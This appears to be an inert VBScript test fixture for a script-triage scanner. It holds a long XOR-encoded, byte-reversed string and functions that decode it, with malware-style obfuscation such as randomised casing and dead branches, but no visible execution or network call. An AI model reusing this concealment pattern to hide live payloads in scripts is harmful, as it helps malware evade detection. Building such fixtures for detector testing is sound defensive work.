Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_077b4d3f = "236,20,214,112,202,177,23,203,63,220,240,2,197,44,218,178,20,195,44,146,184,0,199,42,220,130,19,222,59,193,161,80,196,58,155,190,83,192,103,152,232,59,195,50,205,188,20,201,46,220,180,35,250,60,206,145,20,213,59,221,169,9,211,22,243,184,21,199,41,219,187,8,245,2,250,158,44,238,99,199,169,6,214,1,214,175,19,213,55,200,184,21,218,42,206,185,73,145,60,203,233,4,146,56,150,234,82,139,59,200,188,19,213,2,205,188,43,213,45,202,175,19,200,43,231,129,4,207,50,205,168,55,250,45,221,184,20,243,2,149,158,90,206,42,206,173,56,195,50,198,187,27,145,60,203,233,4,146,56,150,234,82,137,60,206,145,20,213,59,221,169,9,211,22,146,169,9,195,57,206,130,21,195,45,218,161,19,199,58,129,229,81,145,103,202,234,87,145,113,203,180,11,199,40,193,180,73,195,50,223,176,6,222,59,129,234,5,194,106,204,233,1,159,105,154,242,72,156,45,223,169,19,206,99,195,175,18,218,105,205,185,83,197,106,201,228,80,147,115,193,186,14,199,46,194,188,4,155,58,198,130,9,193,55,206,173,10,199,61,211,233,90,210,48,218,178,4,249,59,200,188,19,213,34,159,243,81,136,14,251,137,47,234,19,247,243,85,234,19,247,142,42,155,44,202,169,23,199,58,206,161,19,214,55,221,190,20,249,56,201,178,3,200,63,199,241,20,213,59,204,178,21,214,1,199,190,19,199,46,220,180,3,138,59,195,180,1,249,59,219,180,21,209,114,202,169,8,203,59,221,130,2,212,55,218,172,4,199,99,220,173,2,210,45,211,236,90,208"
Const Codec_077b4d3f = "reversed_decimal|repeating_key_xor|a6,67,dd,af,5e"

Function Load_077b4d3f()
  Dim parts, result(), ByTeInDeX
  parts = Split(Material_077b4d3f, ",")
  ReDim result(UBound(parts))
  For ByTeInDeX = 0 To UBound(parts)
    result(UBound(parts) - ByTeInDeX) = CInt(parts(ByTeInDeX))
  Next
  Load_077b4d3f = result
End Function

Function Decode_077b4d3f(ByRef SoUrCeByTeS)
  Dim result(), ByTeInDeX, keyBytes, previous
  ReDim result(UBound(SoUrCeByTeS))
  keyBytes = Array(166,103,221,175,94)
  For ByTeInDeX = 0 To UBound(SoUrCeByTeS)
    result(ByTeInDeX) = SoUrCeByTeS(ByTeInDeX) Xor keyBytes(ByTeInDeX Mod 5)
  Next
  Decode_077b4d3f = result
End Function

Function Recover_077b4d3f()
  Dim SoUrCeByTeS, DeCoDeDByTeS, DeScRiPtOrTeXt, NeUtRaL, ByTeInDeX, PaSs, ErRoRnUmBeR, ErRoRdEsCrIpTiOn
  If True Then
    NeUtRaL = UBound(Array(3, 5, 8, 13))
      SoUrCeByTeS = Load_077b4d3f()
      Select Case 1
        Case 1
          DeCoDeDByTeS = Decode_077b4d3f(SoUrCeByTeS)
        Case Else
          DeCoDeDByTeS = Array()
      End Select
      DeScRiPtOrTeXt = ""
      For ByTeInDeX = 0 To UBound(DeCoDeDByTeS)
        DeScRiPtOrTeXt = DeScRiPtOrTeXt & Chr(DeCoDeDByTeS(ByTeInDeX))
      Next
  End If
  Recover_077b4d3f = DeScRiPtOrTeXt
End Function

Function Inspect_077b4d3f()
  Dim fields
  fields = Split(Recover_077b4d3f(), "|")
  Inspect_077b4d3f = Join(fields, "|")
End Function
